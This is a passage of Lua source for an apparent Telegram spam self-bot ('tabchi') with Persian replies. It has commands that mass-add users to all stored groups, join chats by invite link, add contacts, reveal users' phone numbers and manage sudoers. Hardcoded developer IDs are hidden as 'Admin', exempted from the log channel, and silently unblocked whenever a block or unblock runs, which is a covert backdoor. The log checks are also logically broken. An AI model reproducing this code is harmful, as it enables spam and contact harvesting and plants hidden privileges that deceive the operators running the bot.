    local text = &quot;سودوهای ربات :\n&quot;
    for d = 1, #b do
      text = tostring(text) .. b[d] .. &quot;\n&quot;
      text = text:gsub(&quot;216430419&quot;, &quot;Admin&quot;)
      text = text:gsub(&quot;256633077&quot;, &quot;Admin&quot;)
    end
    return text
  end
  if msg.text:match(&quot;^[#!/]setname (.*)-(.*)$&quot;) and a(msg) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](setname) (.*)-(.*)$&quot;)
    }
    tdcli.changeName(a7[2], a7[3])
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Changed Name to` *&quot; .. a7[2] .. &quot; &quot; .. a7[3] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    return [[
*وضعیت* : `نام با موفقیت به روز شد`
*نام اصلی* : `]] .. a7[2] .. [[
`
*نام خانوادگی* : `]] .. a7[3] .. &quot;`&quot;
  end
  if msg.text:match(&quot;^[#!/]setusername (.*)$&quot;) and a(msg) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](setusername) (.*)$&quot;)
    }
    tdcli.changeUsername(a7[2])
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Changed Username to` *&quot; .. a7[2] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    return [[
*وضعیت* : `نام کاربری با موفقیت به روز شد
*نام کاربری* : `]] .. a7[2] .. &quot;`&quot;
  end
  if msg.text:match(&quot;^[#!/]clean cache (%d+)[mh]&quot;) then
    local a4 = msg.text:match(&quot;^[#!/]clean cache (.*)&quot;)
    if a4:match(&quot;(%d+)h&quot;) then
      time_match = a4:match(&quot;(%d+)h&quot;)
      timea = time_match * 3600
    end
    if a4:match(&quot;(%d+)m&quot;) then
      time_match = a4:match(&quot;(%d+)m&quot;)
      timea = time_match * 60
    end
    redis:setex(&quot;cachetimer&quot; .. tabchi_id, timea, true)
    redis:set(&quot;cleancachetime&quot; .. tabchi_id, tonumber(timea))
    redis:set(&quot;cleancache&quot; .. tabchi_id, &quot;on&quot;)
    return &quot;`پاک کردن خودکار کش ها برای همیشه فعال گردید` *&quot; .. timea .. &quot;* `ثانیه`&quot;
  end
  if msg.text:match(&quot;^[#!/]clean cache (.*)$&quot;) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](clean cache) (.*)$&quot;)
    }
    if a7[2] == &quot;off&quot; then
      redis:set(&quot;cleancache&quot; .. tabchi_id, &quot;off&quot;)
      return &quot;`پاک کردن کش خودکار غیرفعال شد`&quot;
    end
    if a7[2] == &quot;on&quot; then
      redis:set(&quot;cleancache&quot; .. tabchi_id, &quot;on&quot;)
      return &quot;`پاک کردن کش خودکار فعال گردید`&quot;
    end
  end
  if msg.text:match(&quot;^[#!/]check links (%d+)[mh]&quot;) then
    local a4 = msg.text:match(&quot;^[#!/]check links (.*)&quot;)
    if a4:match(&quot;(%d+)h&quot;) then
      time_match = a4:match(&quot;(%d+)h&quot;)
      timea = time_match * 3600
    end
    if a4:match(&quot;(%d+)m&quot;) then
      time_match = a4:match(&quot;(%d+)m&quot;)
      timea = time_match * 60
    end
    redis:setex(&quot;checklinkstimer&quot; .. tabchi_id, timea, true)
    redis:set(&quot;checklinkstime&quot; .. tabchi_id, tonumber(timea))
    redis:set(&quot;checklinks&quot; .. tabchi_id, &quot;on&quot;)
    return &quot;`زمان چک کردن خودکار لینک ها برای همیشه فعال گردید` *&quot; .. timea .. &quot;* `ثانیه`&quot;
  end
  if msg.text:match(&quot;^[#!/]check links (.*)$&quot;) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](check links) (.*)$&quot;)
    }
    if a7[2] == &quot;off&quot; then
      redis:set(&quot;checklinks&quot; .. tabchi_id, &quot;off&quot;)
      return &quot;`چک کردن خودکار لینک ها غیر فعال گردید`&quot;
    end
    if a7[2] == &quot;on&quot; then
      redis:set(&quot;checklinks&quot; .. tabchi_id, &quot;on&quot;)
      return &quot;`چک کردن خودکار لینک ها فعال شد`&quot;
    end
  end
  if msg.text:match(&quot;^[#!/]setlogs (.*)$&quot;) and a(msg) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](setlogs) (.*)$&quot;)
    }
    redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;, a7[2])
    return &quot;مکان لینک برای اجرای دستورات قرار داده شد&quot;
  end
  if msg.text:match(&quot;^[#!/]delusername$&quot;) and a(msg) then
    tdcli.changeUsername()
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `deleted Username`&quot;, 1, &quot;md&quot;)
    end
    return [[
*وضعیت* : `نام کاربر با موفقیت به روز شد`
*نام کاربری* : `حذف شده`]]
  end
  if msg.text:match(&quot;^[!/#]addtoall (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](addtoall) (.*)$&quot;)
    }
    local sgps = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
    for d = 1, #sgps do
      tdcli.addChatMember(sgps[d], a6[2], 50)
    end
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Added User ` *&quot; .. a6[2] .. &quot;* to all groups&quot;, 1, &quot;md&quot;)
    end
    return &quot;`کاربر` *&quot; .. a6[2] .. &quot;* `به گره ها اضافه شد`&quot;
  end
  if msg.text:match(&quot;^[!/#]getcontact (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](getcontact) (.*)$&quot;)
    }
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, &quot;&quot;, D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = &quot;GetUser&quot;,
      user_id_ = a6[2]
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match(&quot;^[#!/]addsudo$&quot;) and msg.reply_to_message_id_ and a(msg) then
    function addsudo_by_reply(y, z, ad)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(z.sender_user_id_))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;`User` *&quot; .. z.sender_user_id_ .. &quot;* `Added To The Sudoers`&quot;, 1, &quot;md&quot;)
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addsudo_by_reply)
  end
  if msg.text:match(&quot;^[#!/]remsudo$&quot;) and msg.reply_to_message_id_ and is_full_sudo(msg) then
    function remsudo_by_reply(y, z, ad)
      redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(z.sender_user_id_))
      return &quot;`User` *&quot; .. z.sender_user_id_ .. &quot;* `از لیست سودو های ربات حذف شد`&quot;
    end
    K(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
  end
  if msg.text:match(&quot;^[#!/]unblock$&quot;) and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function unblock_by_reply(y, z, ad)
      tdcli.unblockUser(z.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, z.sender_user_id_)
      return 1, &quot;*کاربر* `&quot; .. z.sender_user_id_ .. &quot;` *آزاد شد*&quot;
    end
    K(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
  end
  if msg.text:match(&quot;^[#!/]block$&quot;) and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function block_by_reply(y, z, ad)
      tdcli.blockUser(z.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, z.sender_user_id_)
      return &quot;*کاربر* `&quot; .. z.sender_user_id_ .. &quot;` *مسدود شد*&quot;
    end
    K(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
  end
  if msg.text:match(&quot;^[#!/]id$&quot;) and msg.reply_to_message_id_ ~= 0 and a(msg) then
    function id_by_reply(y, z, ad)
      return &quot;*ID :* `&quot; .. z.sender_user_id_ .. &quot;`&quot;
    end
    K(msg.chat_id_, msg.reply_to_message_id_, id_by_reply)
  end
  if msg.text:match(&quot;^[#!/]serverinfo$&quot;) and a(msg) then
    io.popen(&quot;chmod 777 info.sh&quot;)
    local text = io.popen(&quot;./info.sh&quot;):read(&quot;*all&quot;)
    local text = text:gsub(&quot;Server Information&quot;, &quot;`مشخصات سرور`&quot;)
    local text = text:gsub(&quot;Total Ram&quot;, &quot;`رَم`&quot;)
    local text = text:gsub(&quot;&gt;&quot;, &quot;*&gt;*&quot;)
    local text = text:gsub(&quot;Ram in use&quot;, &quot;`مقدار استفاده رَم  `&quot;)
    local text = text:gsub(&quot;Cpu in use&quot;, &quot;`مقدار استفاده سی پی یو`&quot;)
    local text = text:gsub(&quot;Running Process&quot;, &quot;`برنامه های درحال اجرا `&quot;)
    local text = text:gsub(&quot;Server Uptime&quot;, &quot;`آپتایم سرور`&quot;)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got server info`&quot;, 1, &quot;md&quot;)
    end
    return text
  end
  if msg.text:match(&quot;^[#!/]inv$&quot;) and msg.reply_to_message_id_ and a(msg) then
    function inv_reply(y, z, ad)
      tdcli.addChatMember(z.chat_id_, z.sender_user_id_, 5)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Invited User` *&quot; .. z.sender_user_id_ .. &quot;* to *&quot; .. z.chat_id_ .. &quot;*&quot;, 1, &quot;md&quot;)
      end
    end
    K(msg.chat_id_, msg.reply_to_message_id_, inv_reply)
  end
  if msg.text:match(&quot;^[!/#]addtoall$&quot;) and msg.reply_to_message_id_ and a(msg) then
    function addtoall_by_reply(y, z, ad)
      local sgps = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
      for d = 1, #sgps do
        tdcli.addChatMember(sgps[d], z.sender_user_id_, 50)
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Added User` *&quot; .. z.sender_user_id_ .. &quot;* `to All Groups`&quot;, 1, &quot;md&quot;)
      end
      return &quot;`کاربر` *&quot; .. z.sender_user_id_ .. &quot;* `به گروه ها اضافه شد`&quot;
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
  end
  if msg.text:match(&quot;^[#!/]id @(.*)$&quot;) and a(msg) then
    do
      local a6 = {
        string.match(msg.text, &quot;^[#/!](id) @(.*)$&quot;)
      }
      function id_by_username(y, z, ad)
        if z.id_ then
          text = &quot;*نام کاربری* : `@&quot; .. a6[2] .. [[
`
*ID* : `(]] .. z.id_ .. &quot;)`&quot;
        else
          text = &quot;*نام کاربر اشتباه!*&quot;
          return text
        end
      end
      resolve_username(a6[2], id_by_username)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]addtoall @(.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](addtoall) @(.*)$&quot;)
    }
    function addtoall_by_username(y, z, ad)
      if z.id_ then
        local sgps = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
        for d = 1, #sgps do
          tdcli.addChatMember(sgps[d], z.id_, 50)
        end
      end
    end
    resolve_username(a6[2], addtoall_by_username)
  end
  if msg.text:match(&quot;^[#!/]block @(.*)$&quot;) and a(msg) then
    do
      local a6 = {
        string.match(msg.text, &quot;^[#/!](block) @(.*)$&quot;)
      }
      function block_by_username(y, z, ad)
        if z.id_ then
          tdcli.blockUser(z.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, z.id_)
          return [[
*کاربر مسدود شد*
*نام کاربری* : `]] .. a6[2] .. [[
`
*شناسه* : `]] .. z.id_ .. &quot;`&quot;
        else
          return [[
`#404
`*نام کاربری یافت نشد*
*نام کاربری* : `]] .. a6[2] .. &quot;`&quot;
        end
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Blocked` *&quot; .. a6[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      resolve_username(a6[2], block_by_username)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]unblock @(.*)$&quot;) and a(msg) then
    do
      local a6 = {
        string.match(msg.text, &quot;^[#/!](unblock) @(.*)$&quot;)
      }
      function unblock_by_username(y, z, ad)
        if z.id_ then
          tdcli.unblockUser(z.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, z.id_)
          return [[
*کاربر آزاد شد*
*نام کاربری* : `]] .. a6[2] .. [[
`
*شناسه* : `]] .. z.id_ .. &quot;`&quot;
        end
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `UnBlocked` *&quot; .. a6[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      resolve_username(a6[2], unblock_by_username)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]joinchat (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#!/](joinchat) (.*)$&quot;)
    }
    tdcli.importChatInviteLink(a6[2])
  end
  if msg.text:match(&quot;^[#!/]addsudo @(.*)$&quot;) and a(msg) then
    do
      local a6 = {
        string.match(msg.text, &quot;^[#/!](addsudo) @(.*)$&quot;)
      }
      function addsudo_by_username(y, z, ad)
        if z.id_ then
          redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(z.id_))
          local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Added` *&quot; .. a6[2] .. &quot;* `to Sudoers`&quot;, 1, &quot;md&quot;)
          end
          return &quot;`کاربر` *&quot; .. z.id_ .. &quot;* `اضافه شد به سودو ها`&quot;
        end
      end
      resolve_username(a6[2], addsudo_by_username)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]remsudo @(.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](remsudo) @(.*)$&quot;)
    }
    function remsudo_by_username(y, z, ad)
      if z.id_ then
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, tonumber(z.id_))
        return &quot;`کاربر` *&quot; .. z.id_ .. &quot;* `حذف شد از لیست سودو ها`&quot;
      end
    end
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `removed` *&quot; .. a6[2] .. &quot;* `From sudoers`&quot;, 1, &quot;md&quot;)
    end
    resolve_username(a6[2], remsudo_by_username)
  end
  if msg.text:match(&quot;^[#!/]inv @(.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](inv) @(.*)$&quot;)
    }
    function inv_by_username(y, z, ad)
      if z.id_ then
        tdcli.addChatMember(msg.chat_id_, z.id_, 5)
        return &quot;`کاربر` *&quot; .. z.id_ .. &quot;* `دعوت داده شد`&quot;
      end
    end
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Invited` *&quot; .. a6[2] .. &quot;* `To` *&quot; .. msg.chat_id_ .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    resolve_username(a6[2], inv_by_username)
  end
  if msg.text:match(&quot;^[#!/]send (.*)$&quot;) and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](send) (.*)$&quot;)
    }
    tdcli.send_file(msg.chat_id_, &quot;Document&quot;, a6[2], nil)
  end
  if msg.text:match(&quot;^[#!/]addcontact (.*) (.*) (.*)$&quot;) and a(msg) then
    local a4 = {
      string.match(msg.text, &quot;^[#/!](addcontact) (.*) (.*) (.*)$&quot;)
    }
    phone = a4[2]
    first_name = a4[3]
    last_name = a4[4]
    tdcli.add_contact(phone, first_name, last_name, 12345657)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Added Contact` *&quot; .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    return [[
*وضعیت* : `مخاطب اضافه شد`
*نام اصلی* : `]] .. a4[3] .. [[
`
*نام خانوادگی* : `]] .. a4[4] .. &quot;`&quot;
  end
  if msg.text:match(&quot;^[#!/]leave(-%d+)&quot;) and a(msg) then
    do
      local a7 = {
        string.match(msg.text, &quot;^[#/!](leave)(-%d+)$&quot;)
      }
      function get_id(C, D)
        if D.id_ then
          tdcli.sendMessage(a7[2], 0, 1, &quot;\216\168\216\167\219\140 \216\177\217\129\217\130\216\167\n\218\169\216\167\216\177\219\140 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\217\135 \217\190\219\140 \217\136\219\140 \217\133\216\177\216\167\216\172\216\185\217\135 \218\169\217\134\219\140\216\175&quot;, 1, &quot;html&quot;)
          tdcli.chat_leave(a7[2], D.id_)
          local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
          if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
            tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Commanded Bot to Leave` *&quot; .. a7[2] .. &quot;*&quot;, 1, &quot;md&quot;)
          end
          return &quot;*ربات با موفقیت ترک شد از &gt;* `&quot; .. a7[2] .. &quot;`&quot;
        end
      end
      tdcli_function({ID = &quot;GetMe&quot;}, get_id, {
        chat_id = msg.chat_id_
      })
    end
  else
  end
  if msg.text:match(&quot;[#/!]join(-%d+)&quot;) and a(msg) then
    local a7 = {
      string.match(msg.text, &quot;^[#/!](join)(-%d+)$&quot;)
    }
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*You SuccefullY Joined*&quot;, 1, &quot;md&quot;)
    tdcli.addChatMember(a7[2], msg.sender_user_id_, 10)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Commanded bot to invite him to` *&quot; .. a7[2] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
  end
  if msg.text:match(&quot;^[#!/]getpro (%d+) (%d+)$&quot;) and a(msg) then
    do
      local ae = {
        string.match(msg.text, &quot;^[#/!](getpro) (%d+) (%d+)$&quot;)
      }
      local af = function(y, z, ad)
        if ae[3] == &quot;1&quot; then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, &quot;@Te1egamer&quot;)
          else
            return &quot;*;کاربر هیچ عکسی ندارد!!*&quot;
          end
        elseif ae[3] == &quot;2&quot; then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, &quot;@Te1egamer&quot;)
          else
            return &quot;*کاربر 2 عکس پروفایل ندارد*&quot;
          end
        elseif not ae[3] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*کاربر 2 عکس پروفایل ندارد*&quot;
          end
        elseif ae[3] == &quot;3&quot; then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*کاربر 3 عکس پروفایل ندارد*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[3] == &quot;4&quot; then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*کاربر 4 عکس پروفایل ندارد*&quot;
          end
        elseif ae[3] == &quot;5&quot; then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*کاربر 5 عکس پروفایل ندارد*&quot;
          end
        elseif ae[3] == &quot;6&quot; then
          if z.photos_[5] then
            return &quot;*کاربر 6 عکس پروفایل ندارد*&quot;
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*user Have&#39;nt 6 Profile Photo!!*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[3] == &quot;7&quot; then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*کاربر 7 عکس پروفایل ندارد*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[3] == &quot;8&quot; then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*کاربر 8 عکس پروفایل ندارد*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[3] == &quot;9&quot; then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*کاربر 9 عکس پروفایل ندارد*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[3] == &quot;10&quot; then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*کاربر 10 عکس پروفایل ندارد*&quot;, 1, &quot;md&quot;)
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*من فقط میتوانم 10 عکس پروفایل نشانتان دهم :(*&quot;, 1, &quot;md&quot;)
        end
      end
      tdcli_function({
        ID = &quot;GetUserProfilePhotos&quot;,
        user_id_ = ae[2],
        offset_ = 0,
        limit_ = ae[3]
      }, af, nil)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]getpro (%d+)$&quot;) and msg.reply_to_message_id_ == 0 and a(msg) then
    do
      local ae = {
        string.match(msg.text, &quot;^[#/!](getpro) (%d+)$&quot;)
      }
      local af = function(y, z, ad)
        if ae[2] == &quot;1&quot; then
          if z.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما هیچ عکسی ندارید*&quot;
          end
        elseif ae[2] == &quot;2&quot; then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما 2 عکس پروفایل ندارید *&quot;
          end
        elseif not ae[2] then
          if z.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما 2 عکس پروفایل ندارید*&quot;
          end
        elseif ae[2] == &quot;3&quot; then
          if z.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*شما 3 عکس پروفایل ندارید*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[2] == &quot;4&quot; then
          if z.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما 4 عکس پروفایل ندارید*&quot;
          end
        elseif ae[2] == &quot;5&quot; then
          if z.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما 5 عکس پروفایل ندارید*&quot;
          end
        elseif ae[2] == &quot;6&quot; then
          if z.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            return &quot;*شما 6 عکس پروفایل ندارید*&quot;
          end
        elseif ae[2] == &quot;7&quot; then
          if z.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*شما 7 عکس پروفایل ندارید*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[2] == &quot;8&quot; then
          if z.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*شما 8 عکس پروفایل ندارید*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[2] == &quot;9&quot; then
          if z.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*شما 9 عکس پروفایل ندارید*&quot;, 1, &quot;md&quot;)
          end
        elseif ae[2] == &quot;10&quot; then
          if z.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, &quot;@TE1EgameR&quot;)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*شما 10 عکس پروفایل ندارید*&quot;, 1, &quot;md&quot;)
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, &quot;*I just can get last 10 profile photos:(*&quot;, 1, &quot;md&quot;)
        end
      end
      tdcli_function({
        ID = &quot;GetUserProfilePhotos&quot;,
        user_id_ = msg.sender_user_id_,
        offset_ = 0,
        limit_ = ae[2]
      }, af, nil)
    end
  else
  end
  if msg.text:match(&quot;^[#!/]action (.*)$&quot;) and a(msg) then
